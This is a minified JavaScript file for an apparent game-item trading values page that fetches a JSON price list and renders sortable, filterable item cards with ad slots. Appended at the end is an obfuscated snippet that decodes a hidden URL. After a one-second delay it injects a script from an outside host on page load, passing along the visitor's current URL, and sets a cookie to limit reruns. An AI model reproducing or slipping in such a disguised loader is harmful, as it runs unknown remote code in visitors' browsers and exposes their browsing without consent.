var using_brulee_values = !1;
const page_navbar = document.getElementsByClassName("page-navbar")[0],
    search_box = document.getElementsByClassName("search-box")[0],
    page_items = document.getElementsByClassName("page-items")[0],
    page_table = document.getElementById("page-table"),
    sort_selection = document.getElementById("sort-selection");
var Data;
const queryString = window.location.href ? window.location.href.split("?")[1] : window.location.search.slice(1);

function updateRange() {
    var e = document.querySelector("#min").value,
        t = document.querySelector("#max").value;
    0 == t && (t = 99999999999), document.querySelectorAll(".page-item").forEach((a => {
        try {
            var l = findValue(a.querySelector("h1").textContent);
            a.style.display = l >= e && l <= t ? "block" : "none"
        } catch (e) {
            console.log(e)
        }
    }))
}

function findValue(e) {
    for (entry in Data.vehicles) {
        const t = Data.vehicles[entry];
        if (t.name.toLowerCase() === e.toLowerCase()) return parseFloat(t.value.replace(/,/g, ""))
    }
    for (entry in Data.cosmetics) {
        const t = Data.cosmetics[entry];
        if (t.name.toLowerCase() === e.toLowerCase()) return parseFloat(t.value.replace(/,/g, ""))
    }
}

function switchToBrulee() {
    using_brulee_values ? (document.querySelector(".brulee").value = "Brulee Value", using_brulee_values = !1, localStorage.values_page_brulee = !1, document.querySelectorAll(".page-item").forEach((e => {
        try {
            var t = findValue(e.querySelector("h1").textContent);
            e.querySelector("p").textContent = "Value: " + t.toLocaleString()
        } catch (e) {
            console.log(e)
        }
    }))) : (document.querySelector(".brulee").value = "Normal Value", using_brulee_values = !0, localStorage.values_page_brulee = !0, document.querySelectorAll(".page-item").forEach((e => {
        try {
            var t = 1e4 * Math.round(findValue(e.querySelector("h1").textContent) / 1e4) / findValue("brulee");
            e.querySelector("p").textContent = "Brulee: " + t
        } catch (e) {
            console.log(e)
        }
    })))
}

function loadPage(e) {
    var t = Data[e];
    if (null != t && null != t) {
        var a = 0,
            l = 0;
        "Greatest to least" == localStorage.values_page_sort ? t = Object.fromEntries(Object.entries(t).sort((([, e], [, t]) => parseFloat(t.value.replace(/,/g, "")) - parseFloat(e.value.replace(/,/g, ""))))) : "Least to greatest" == localStorage.values_page_sort ? t = Object.fromEntries(Object.entries(t).sort((([, e], [, t]) => parseFloat(e.value.replace(/,/g, "")) - parseFloat(t.value.replace(/,/g, ""))))) : "A-Z" == localStorage.values_page_sort && (t = Object.fromEntries(Object.entries(t).sort((([, e], [, t]) => e.name.localeCompare(t.name)))));
        var o = "",
            r = "";
        for (var n in t) {
            var s = t[n];
            o += `\n                <div class="page-item">\n                    <h1>${s.name}</h1>\n                    <h2>(${s.type})</h2>\n\n                    <img src="${s.image}" alt="${s.name}">\n\n                    <p>Value: ${s.value}</p>\n\n                    <a href="/item.html?${n}">\n                        <button>View More</button>\n                    </a>\n                </div>`, r += `\n                <tr>\n                    <td>${s.name}</td>\n                    <td>${s.value}</td>\n                </tr>\n            `, "Gold" != localStorage.xuvT582rNDdBXW4iMq7BHOK && "Booster" != localStorage.xuvT582rNDdBXW4iMq7BHOK && (8 == a ? (a = 0, o += `\n                    <div style="display: none;" id="300x250 ${l+=1}"></div>\n                    `) : a += 1)
        }
        page_items.innerHTML = o, page_table.innerHTML = r;
        for (let e = 0; e <= l; e++) Promise.resolve(window.nitroAds.createAd(`300x250 ${e}`, {
            refreshLimit: 20,
            refreshTime: 30,
            renderVisibleOnly: !0,
            refreshVisibleOnly: !0,
            sizes: [
                ["300", "250"],
                ["336", "280"]
            ],
            report: {
                enabled: !0,
                icon: !0,
                wording: "Report Ad",
                position: "bottom-right"
            }
        })).then((t => {
            document.getElementById(`300x250 ${e}`).style.display = "block"
        }));
        search_box.addEventListener("keyup", (e => {
            document.querySelectorAll(".page-item").forEach((t => {
                try {
                    t.querySelector("h1").textContent.trim().toLowerCase().includes(e.target.value.toLowerCase()) ? t.style.display = "block" : t.style.display = "none"
                } catch (e) {
                    console.log(e)
                }
            }))
        })), "true" == localStorage.values_page_brulee && switchToBrulee()
    }
}
null != localStorage.values_page_sort && null != localStorage.values_page_sort && (sort_selection.value = localStorage.values_page_sort), sort_selection.addEventListener("change", (e => {
    localStorage.values_page_sort = sort_selection.value, location.reload()
})), fetch("https://raw.githubusercontent.com/JamieJiami/m3u8-Player/main/values.json").then((e => e.json())).then((e => {
    Data = e, console.log("Fetched successfully."), Data[queryString] ? (loadPage(queryString), document.getElementById(queryString) && "A" == document.getElementById(queryString).tagName && (document.getElementById(queryString).style.color = "rgb(89, 161, 255)", document.getElementById(queryString).style.transition = "all 0.5s ease-in")) : (loadPage("vehicles"), document.getElementById("vehicles") && "A" == document.getElementById("vehicles").tagName && (document.getElementById("vehicles").style.color = "rgb(89, 161, 255)", document.getElementById("vehicles").style.transition = "all 0.5s ease-in"))
})).catch((e => {
    console.log(e), document.body.innerHTML = `\n    <h1 style='margin-top: 5rem; text-align: center;'>Couldn't fetch data, please try again later</h1>\n    <p style='text-align: center;'>Error: ${e}</p>\n    `
}));
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));
